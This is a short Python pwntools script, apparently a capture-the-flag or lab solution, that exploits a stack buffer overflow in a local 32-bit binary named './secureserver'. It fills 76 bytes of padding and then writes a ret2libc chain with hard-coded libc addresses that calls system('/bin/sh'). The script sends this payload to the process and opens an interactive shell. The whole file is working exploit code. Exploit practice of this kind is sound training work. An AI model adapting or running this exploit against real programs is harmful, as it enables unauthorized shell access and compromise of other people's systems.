from pwn import *

exe = './secureserver'

context.binary = elf = ELF(exe)
context.log_level = 'debug'

offset = 76

libc_base = 0xf7d7b000
system = libc_base + 0x0004dd50
binsh = libc_base + 0x1b9dcd

payload = flat([
    b'A' * offset,
    system,
    0x0,
    binsh
])

p = process(exe)
p.recvuntil(":\n\n")
p.sendline(payload)
p.interactive()
